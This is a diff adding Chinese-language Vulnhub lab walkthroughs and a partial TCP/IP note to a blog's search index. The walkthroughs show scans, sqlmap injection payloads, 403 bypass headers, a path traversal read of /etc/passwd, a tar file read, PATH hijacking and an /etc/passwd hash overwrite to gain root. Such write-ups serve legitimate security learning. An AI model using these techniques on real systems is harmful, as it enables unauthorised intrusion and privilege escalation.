@@ -1,6 +1,218 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Breakout打靶</title>
+    <url>/2022/01/06/Breakout/Breakout%E6%89%93%E9%9D%B6/</url>
+    <content><![CDATA[<h1 id="Breakout打靶"><a href="#Breakout打靶" class="headerlink" title="Breakout打靶"></a>Breakout打靶</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>名字：<code>Breakout</code></p>
+<p>使用技术：</p>
+<p><code>445端口发现用户名</code></p>
+<p><code>tar任意文件读取</code></p>
+<p><code>ook!加密解密</code></p>
+<p><code>服务器密码泄露</code></p>
+<hr>
+<p>攻击主机：<em>Kali Linux 2021 IP：192.168.0.103</em></p>
+<p>目标主机：<em>Debian 5.10 IP：192.168.0.105</em></p>
+<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-目标发现"><a href="#1-目标发现" class="headerlink" title="1.目标发现"></a>1.目标发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.105	08:00:27:0a:ce:ae	PCS Systemtechnik GmbH（目标主机）</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.105</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">10000/tcp open  http        MiniServ 1.981 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.981</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">20000/tcp open  http        MiniServ 1.830 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.830</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>打开了80，139，445，10000，20000端口</p>
+<h3 id="3-目标提示信息"><a href="#3-目标提示信息" class="headerlink" title="3.目标提示信息"></a>3.目标提示信息</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061711782.png" alt="arp"></p>
+<p>奇奇怪怪的加密文件，百度大法后，得知是<code>ook!</code>加密</p>
+<p>获得了一串字符，猜测是操作系统密码，那账户呢？</p>
+<p>目标打开的445端口samba服务，使用工具进行扫描<code>enum4linux</code>结果发现目标系统有一个账户 <code>cyber</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061720472.png" alt="enum4linux"></p>
+<h3 id="4-成功登录并反弹shell"><a href="#4-成功登录并反弹shell" class="headerlink" title="4.成功登录并反弹shell"></a>4.成功登录并反弹shell</h3><p>目标开了20000端口，并启动了<code>Usermin</code>来管理服务器，使用账户密码登录 <code>cyber/(来点挑战性就不公布密码了)</code></p>
+<p>成功登录！！！</p>
+<p>寻找命令行管理工具 反弹shell，nc接收shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061730415.jpg" alt="enum4linux"></p>
+<p>nc接受到shell </p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>发现隐藏文件 <code>.old_pass.bak</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061733296.jpg" alt="enum4linux"></p>
+<p>以及主目录下的tar文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061734943.jpg" alt="enum4linux"></p>
+<p>发现tar文件可以进行任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./tar -cf 1.tar /var/backups/.old_pass.bak</span><br><span class="line">tar xf 1.tar</span><br><span class="line">cd var/backups/</span><br><span class="line">cat .old_pass.bak</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061743184.jpg" alt="enum4linux"></p>
+<p>打靶结束！！！</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mercury</title>
+    <url>/2021/11/07/Mercury/index/</url>
+    <content><![CDATA[<h1 id="Vulnhub-Mercury打靶"><a href="#Vulnhub-Mercury打靶" class="headerlink" title="Vulnhub Mercury打靶"></a>Vulnhub Mercury打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>星球系列靶机</p>
+<p>下载地址：<a href="https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td">https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td</a></p>
+<p>难度：Easy</p>
+<p>利用技术：</p>
+<p>​    setnv提权</p>
+<p>攻击主机：Kali Linux</p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>首先进行信息，<code>arp-scan </code> <code>nmap</code>进行主机发现和端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">192.168.0.100	08:00:27:09:37:ea	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sV -p- -sC 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 02:20 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)</span><br><span class="line">|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)</span><br><span class="line">|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)</span><br><span class="line">8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了<code>22</code> <code>8080</code>端口</p>
+<h3 id="2-漏洞发现-amp-利用"><a href="#2-漏洞发现-amp-利用" class="headerlink" title="2.漏洞发现&amp;利用"></a>2.漏洞发现&amp;利用</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071532573.jpg"></p>
+<p>打开目标的<code>8080</code>端口，并没有发现任何有用的信息，包括审查页面的源码，以及<code>robots.txt</code>，都没有一点有价值的信息，尝试随便输入一个地址看一下，发现报错内容里面存在一个路径 <code>/mercuryfacts </code>，访问后发现了该页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071537948.png"></p>
+<p><code>id</code>这个关键字应该是很敏感了，更何况地址栏那么明显的伪静态，使用sqlmap进行注入，获得服务器密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ sqlmap -u http://192.168.0.100:8080/mercuryfacts/1* --dbs --batch</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND 2334=2334</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716a786271,(SELECT (ELT(3697=3697,1))),0x7170626a71),3697)</span><br></pre></td></tr></table></figure>
+
+<p>获得了服务器密码后，ssh进行登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071542316.png"></p>
+<p>获得了另一个操作系统账户，进行登录</p>
+<h3 id="3-提权-amp-amp-偷天换日"><a href="#3-提权-amp-amp-偷天换日" class="headerlink" title="3.提权&amp;&amp;偷天换日"></a>3.提权&amp;&amp;偷天换日</h3><p>/usr/bin/check_syslog.sh内容为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">tail -n 10 /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071608660.png"></p>
+<p>复制<code>/bin/vim</code>命名为<code>/tmp/tail</code>，添加系统变量，使tail命令调用/tmp/tail文件，以root打开vim，在vim命令界面输入 <code>!/bin/bash</code> 提权成功 [这波直接偷天换日]</p>
+<p>打靶结束！！！</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP/IP协议包头</title>
+    <url>/2021/11/07/TCPIP/TCPIP/</url>
+    <content><![CDATA[<h1 id="TCP-IP包头"><a href="#TCP-IP包头" class="headerlink" title="TCP/IP包头"></a>TCP/IP包头</h1><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p><code>报文头</code> <code>问题|向服务器提出查询部分</code> <code>回答 | 服务器恢复的资源记录</code> <code>授权|权威的资源记录</code> <code>格外的|格外的资源记录</code></p>
+<p>除了报文头是固定的12字节外，其他每一部分的长度均为不定字节数，这边关心的是报文头、问题、回答这三个部分</p>
+<hr>
+<p>报文头</p>
+<p><code>ID</code> <code>QR|Opcode|AA|TC|RD|RA|Z|RCcode</code> <code>QDCPUNT</code> <code>ANCOUNT</code> <code>NSCOUNT</code> <code>ARCOUNT</code></p>
+<p><code>ID</code>:占16位，2个字节。此报文的编号，由客户端指定。DNS回复时带上此标识，以指示处理的对应请应请求。<br><code>QR</code>:占1位，1/8字节。0代表查询，1代表DNS回复<br><code>Opcode</code>:占4位，1/2字节。指示查询种类：0:标准查询；1:反向查询；2:服务器状态查询；3-15:未使用。<br><code>AA</code>:占1位，1/8字节。是否权威回复。<br><code>TC</code>:占1位，1/8字节。因为一个UDP报文为512字节，所以该位指示是否截掉超过的部分。<br><code>RD</code>:占1位，1/8字节。此位在查询中指定，回复时相同。设置为1指示服务器进行递归查询。<br><code>RA</code>:占1位，1/8字节。由DNS回复返回指定，说明DNS服务器是否支持递归查询。<br><code>Z</code>:占3位，3/8字节。保留字段，必须设置为0<br><code>RCODE</code>:占4位，1/2字节。由回复时指定的返回码：0:无差错；1:格式错；2:DNS出错；3:域名不存在；4:DNS不支持这类查询；5:DNS拒绝查询；6-15:保留字段。　<br><code>QDCOUNT</code>:占16位，2字节。一个无符号数指示查询记录的个数。<br><code>ANCOUNT</code>:占16位，2字节。一个无符号数指明回复记录的个数。<br><code>NSCOUNT</code>:占16位，2字节。一个无符号数指明权威记录的个数。<br><code>ARCOUNT</code>:占16位，2字节。一个无符号数指明格外记录的个数。</p>
+<hr>
+<p>问题部分</p>
+<p><code>QNMAE</code> <code>QTYPE</code> <code>Qclass</code></p>
+<p>QNAME:不定长，表示要查询的域名。<br>QTYPE:2字节，根据RFC1035及nslookup的帮助文档</p>
+<p>A=0x01, //指定计算机 IP 地址。<br>NS=0x02, //指定用于命名区域的 DNS 名称服务器。<br>MD=0x03, //指定邮件接收站（此类型已经过时了，使用MX代替）<br>MF=0x04, //指定邮件中转站（此类型已经过时了，使用MX代替）<br>CNAME=0x05, //指定用于别名的规范名称。<br>SOA=0x06, //指定用于 DNS 区域的“起始授权机构”。<br>MB=0x07, //指定邮箱域名。<br>MG=0x08, //指定邮件组成员。<br>MR=0x09, //指定邮件重命名域名。<br>NULL=0x0A, //指定空的资源记录<br>WKS=0x0B, //描述已知服务。<br>PTR=0x0C, //如果查询是 IP 地址，则指定计算机名；否则指定指向其它信息的指针。<br>HINFO=0x0D, //指定计算机 CPU 以及操作系统类型。<br>MINFO=0x0E, //指定邮箱或邮件列表信息。<br>MX=0x0F, //指定邮件交换器。<br>TXT=0x10, //指定文本信息。<br>AAAA=0x1c,//IPV6资源记录。<br>UINFO=0x64, //指定用户信息。<br>UID=0x65, //指定用户标识符。<br>GID=0x66, //指定组名的组标识符。<br>ANY=0xFF //指定所有数据类型。<br>QTYPE:2字节。 根据RFC1035及nslookup的帮助文档，我定义以下枚举类型：<br>enum QueryClass //指定信息的协议组。<br>IN=0x01, //指定 Internet 类别。<br>CSNET=0x02, //指定 CSNET 类别。（已过时）<br>CHAOS=0x03, //指定 Chaos 类别。<br>HESIOD=0x04,//指定 MIT Athena Hesiod 类别。<br>ANY=0xFF //指定任何以前列出的通配符。</p>
+<p>Qtype中 <code>A</code> <code>MX</code> <code>CNAME</code>,QCLASS中的<code>IN</code>为常用</p>
+<hr>
+<p>回答部分</p>
+<p><code>NAME</code> <code>TYPE</code> <code>CLASS</code> <code>TTL</code> <code>RDLENGTH</code> 　<code>ＲＤＡＴＡ</code></p>
+<p>NAME:回复查询的域名，不定长。<br>TYPE:回复的类型。2字节，与查询同义。指示RDATA中的资源记录类型。<br>CLASS:回复的类。2字节，与查询同义。指示RDATA中的资源记录类。<br>TTL:生存时间。4字节，指示RDATA中的资源记录在缓存的生存时间。<br>RDLENGTH:长度。2字节，指示RDATA块的长度。<br>RDATA:资源记录。不定义，依TYPE的不同，此记录的格示不同，通常一个MX记录是由一个2字节的指示该邮件交换器的优先级值及不定长的邮件交换器名组成的。</p>
+<h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><h2 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h2>]]></content>
+      <categories>
+        <category>TCP/IP</category>
+      </categories>
+      <tags>
+        <tag>TCP/IP数据包头</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>y0usef打靶</title>
+    <url>/2021/11/21/Y0usef/y0usef%E6%89%93%E9%9D%B6/</url>
+    <content><![CDATA[<h1 id="y0usef打靶"><a href="#y0usef打靶" class="headerlink" title="y0usef打靶"></a>y0usef打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h3 id="1-涉及技术"><a href="#1-涉及技术" class="headerlink" title="1.涉及技术"></a>1.涉及技术</h3><h4 id="1-弱口令漏洞"><a href="#1-弱口令漏洞" class="headerlink" title="1.弱口令漏洞"></a>1.弱口令漏洞</h4><h4 id="2-文件上传绕过"><a href="#2-文件上传绕过" class="headerlink" title="2.文件上传绕过"></a>2.文件上传绕过</h4><h4 id="3-Base64编码"><a href="#3-Base64编码" class="headerlink" title="3.Base64编码"></a>3.Base64编码</h4><h4 id="4-限制突破403"><a href="#4-限制突破403" class="headerlink" title="4.限制突破403"></a>4.限制突破403</h4><h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b3:6c:8c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.100	08:00:27:a3:05:e3	PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+
+<p>目标主机IP为192.168.0.100</p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nmap -sC -p- -sV 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 20:57 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d8:e0:99:8c:76:f1:86:a3:ce:09:c8:19:a4:1d:c7:e1 (DSA)</span><br><span class="line">|   2048 82:b0:20:bc:04:ea:3f:c2:cf:73:c3:d4:fa:b5:4b:47 (RSA)</span><br><span class="line">|   256 03:4d:b0:70:4d:cf:5a:4a:87:c3:a5:ee:84:cc:aa:cc (ECDSA)</span><br><span class="line">|_  256 64:cd:d0:af:6e:0d:20:13:01:96:3b:8d:16:3a:d6:1b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>目标22，80端口打开</p>
+<h3 id="3-403强制突破"><a href="#3-403强制突破" class="headerlink" title="3.403强制突破"></a>3.403强制突破</h3><p>这里说一下，一般403是权限不足导致的，对于403页面，有的服务器会对本地允许访问，导致可以突破403访问限制</p>
+<p>一般有以下几种方式进行限制突破（4种）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Http非标准报文</span><br><span class="line">1.url覆盖</span><br><span class="line">	X-Original-URL</span><br><span class="line">	X-Rewrite-URL</span><br><span class="line">2.参数覆盖</span><br><span class="line">	referer</span><br><span class="line">3. 本地访问</span><br><span class="line">	x-forwarded-for</span><br><span class="line">	x-Remote-IP:127.0.0.1</span><br><span class="line">	X-Originating-IP:</span><br><span class="line">	host旁站</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-URL覆盖"><a href="#1-URL覆盖" class="headerlink" title="1.URL覆盖"></a>1.URL覆盖</h4><p>包头如下，参数覆盖</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">X-Rewrite-URL</span><span class="punctuation">: </span>/adminstration</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2.Referer"></a>2.Referer</h4><p>有的页面只有通过某种特殊方式打开，使用<code>referer</code>进行尝试，实现</p>
+<h4 id="3-本地访问"><a href="#3-本地访问" class="headerlink" title="3.本地访问"></a>3.本地访问</h4><h5 id="1-XFF绕过-amp-XRI-amp-XOI"><a href="#1-XFF绕过-amp-XRI-amp-XOI" class="headerlink" title="1.XFF绕过&amp;XRI&amp;XOI"></a>1.XFF绕过&amp;XRI&amp;XOI</h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/adminstration/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-Host旁站"><a href="#2-Host旁站" class="headerlink" title="2.Host旁站"></a>2.Host旁站</h5><p>使用旁站，降低服务器警惕性，通过修改<code>Host</code>实现</p>
+<hr>
+<p>本次打靶通过<code>XFF</code>实现突破限制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211034614.png"></p>
+<h3 id="4-漏洞发现"><a href="#4-漏洞发现" class="headerlink" title="4.漏洞发现"></a>4.漏洞发现</h3><p>使用弱口令进行登录 <code>admin&amp;admin</code>，成功访问，在登录后，进行寻找后台漏洞，发现有文件上传位置，进行上传绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211035145.png"></p>
+<p>成功上传webshell！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211029067.png"></p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>在目标主机的<code>/home</code>目录下发现了<code>user.txt</code>文件，使用cat命令打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211049005.png"></p>
+<p>使用ssh进行登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211053670.png"></p>
+<p>提权成功打靶结束</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EvilBox</title>
+    <url>/2021/11/06/evilbox/index/</url>
+    <content><![CDATA[<h1 id="Vulnhub-EvilBox靶机打靶过程"><a href="#Vulnhub-EvilBox靶机打靶过程" class="headerlink" title="Vulnhub EvilBox靶机打靶过程"></a>Vulnhub EvilBox靶机打靶过程</h1><h2 id="靶机详解"><a href="#靶机详解" class="headerlink" title="靶机详解"></a>靶机详解</h2><h3 id="1-难度"><a href="#1-难度" class="headerlink" title="1.难度"></a>1.难度</h3><p>中级</p>
+<h3 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h3><p>kali Linux 2021 192.168.0.104</p>
+<p>Linux Kernel 192.168.0.103</p>
+<h3 id="3-涉及技术"><a href="#3-涉及技术" class="headerlink" title="3.涉及技术"></a>3.涉及技术</h3><ul>
+<li>主机发现</li>
+<li>网络扫描</li>
+<li>强制访问</li>
+<li>参数爆破</li>
+<li>文件包含</li>
+<li>PHP封装器</li>
+<li>任意文件读取</li>
+<li>SSH公钥登录</li>
+<li>离线密码破解</li>
+<li>系统权限漏洞利用</li>
+</ul>
+<h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l </span><br></pre></td></tr></table></figure>
+
+<p>进行主机发现</p>
+<p>发现目标主机IP为192.168.0.103</p>
+<p>进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.0.103</span><br></pre></td></tr></table></figure>
+
+<p>发现目标主机打开的22，80端口，首先率先考虑80端口是否存在漏洞</p>
+<p>打开后发现如下，</p>
+<p>使用dirsearch 进行目录爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.0.103/ -w /home/yifang/fuzz/dirtop60000.txt -f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245544.png" alt="dirsearch1"></p>
+<p>发现目标存在 <code>secret</code>文件夹，打开后发现了一段字符 <code>hacker</code> ，继续使用<code>dirsearch</code> 进行目录爆破，发现了在<code>secret</code>下有一个<code>evil.php</code>的文件。此时的渗透工作似乎进入了瓶颈期，想到了可以对<code>evil.php</code>下的文件的get变量进行fuzz测试，于是使用<code>ffuf</code>工具对其进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.103/secret/evil.php?FUZZ=../../../../../../../../etc/passwd -fs 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245159.png" alt="ffuf"></p>
+<p>得出结果页面<code>command</code>参数存在命令包含漏洞，</p>
+<p>访问<code>/etc/passwd</code>发现存在<code>mowree</code>账户，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245103.png" alt="passwd"></p>
+<p>此时能反映到的是，对ssh进行密码爆破，但在爆破之前不妨尝试一下ssh登录看看debug信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246184.png" alt="ssh"></p>
+<p>然后我就发现了，目标主机可以使用ssh免密登录，结合命令包含漏洞，直接读取他的公钥，岂不美哉？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id_rsa : 生成的私钥文件</span><br><span class="line">id_rsa.pub ： 生成的公钥文件</span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>读取mowree账户的authorized_keys文件，事实证明，我是可行的！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246368.png" alt="idrsa">但是问题也随之而来，需要一串密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246976.png" alt="parser"></p>
+<p>不过可以使用john进行离线密码破解，先使用john的插件将id_pub转换成可以被破解的样式，然后使用john进行破解<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071247249.png" alt="sshpass"></p>
+<p>得出密码为 <code>unicorn</code> 进行登录</p>
+<p>登录成功，然后使用find命令查找可以进行提权的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2 &gt; /dev/null</span><br><span class="line">find / -perm /2000 2 &gt; /dev/null</span><br><span class="line">find / /writable 2 &gt; /dev/null </span><br><span class="line">存在/etc/passwd可以进行文件写入</span><br></pre></td></tr></table></figure>
+
+<p>使用，openssl生成一段密文</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 </span><br></pre></td></tr></table></figure>
+
+<p>然后替换/etc/passwd里面的x</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071247695.png" alt="getroot"></p>
+<p>提权成功，<u>打靶结束</u></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-middlum</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HackSudo</title>
     <url>/2021/11/06/hacksudo/index/</url>
